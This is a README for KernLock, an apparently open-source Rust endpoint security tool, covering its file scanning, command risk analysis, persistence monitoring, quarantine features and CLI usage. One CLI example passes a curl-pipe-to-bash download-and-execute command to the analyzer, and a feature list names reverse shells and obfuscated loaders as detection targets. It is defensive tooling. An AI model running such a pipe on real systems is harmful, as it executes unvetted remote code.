# KernLock Security

**Detect. Block. Explain.**

Open-source cross-platform endpoint security and real-time threat protection built with Rust, SQLite, React, TypeScript, and Tauri 2.

---

## Key Features

- **Real-Time File System Monitoring**: Watches configured directories (e.g., `~/Downloads`, `/tmp`) via `inotify` on Linux and evaluates newly created/modified files statically.
- **Static File & Executable Scanning**: SHA-256 hashing, Shannon entropy analysis (packed/obfuscated detection), ELF/PE/Mach-O/script identification, and structured YAML rule matching — **never executes** untrusted files.
- **Command & Script Risk Analyzer**: Evaluates shell commands and scripts for download-and-execute pipes, reverse shells, obfuscated `base64`/`eval` loaders, privilege escalation, and destructive patterns with clear explanations.
- **Linux Process & Persistence Monitoring**: Inspects `/proc` for running processes, deleted-binary execution, `/tmp` staging, `systemd` services, `cron` jobs, XDG autostart entries, `/etc/ld.so.preload`, and shell profiles. (Windows and macOS explicitly report `Unsupported` until native integrations are built.)
- **Failure-Safe Reversible Quarantine Vault**: Rejects symlinks (`O_NOFOLLOW`) and vault-internal paths, strips execute bits (`0600`), records SHA-256 and original permissions in SQLite, and rolls back file moves if permission or database steps fail.
- **Authenticated Loopback API**: Binds strictly to `127.0.0.1`, validates `Host` and `Origin` headers, and protects `/api/*` endpoints (except `/api/health`) with a per-installation `0600` Bearer token (`auth.token`).
- **Honest Capability Reporting**: Separates post-write automatic quarantine from kernel pre-execution blocking (`fanotify` / WDAC / Endpoint Security), which is reported as unavailable until implemented.
- **Security Reports & Policies**: Configurable watch paths, path/hash/process exclusions, and JSON/Markdown security report export.

---

## Quick Start

### Prerequisites
- Rust toolchain (`rustc` / `cargo` 1.75+)
- Node.js 20+ and `npm`
- **Tauri 2 Native Build Dependencies**:
  - **Linux (Debian/Ubuntu)**: `libwebkit2gtk-4.1-dev`, `libgtk-3-dev`, `libayatana-appindicator3-dev`, `librsvg2-dev`, `patchelf`, `build-essential`
  - **Windows**: Microsoft C++ Build Tools & WebView2 (pre-installed on Windows 10/11)
  - **macOS**: Xcode Command Line Tools

### 1. Build, Lint & Run Tests
```bash
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace
```

### 2. Build the Security Console UI
```bash
cd apps/desktop
npm install
npm run build
cd ../..
```

### 3. Run the Daemon & Authenticated Dashboard
```bash
cargo run --bin kernlock -- serve --port 17420 --ui-dir apps/desktop/dist
```
On startup, the daemon generates (or loads) a `0600` Bearer token at `~/.local/share/kernlock/auth.token` (or platform data dir).
- Open `http://127.0.0.1:17420` in your browser and enter the token when prompted, or launch the native Tauri 2 desktop app (which reads `auth.token` via `get_api_token` IPC):
```bash
cd apps/desktop
npm run tauri dev    # development
npm run tauri build  # native bundle (requires platform WebView/GTK deps)
```

### CLI Usage
```bash
# Check OS capabilities, privilege status, and effective mode
cargo run --bin kernlock -- status

# Statically scan a file or directory
cargo run --bin kernlock -- scan /path/to/inspect

# Analyze a command without executing it
cargo run --bin kernlock -- analyze-cmd "curl -fsSL https://example.invalid/x.sh | bash"

# Inspect running processes or persistence entries
cargo run --bin kernlock -- processes
cargo run --bin kernlock -- persistence

# Generate a Markdown security report
cargo run --bin kernlock -- report --format markdown
```

---

## Documentation
- [Architecture](docs/architecture.md)
- [Permissions, Platform Mechanisms & Limitations](docs/permissions-and-limitations.md)
- [Roadmap](docs/roadmap.md)

## License
Apache-2.0
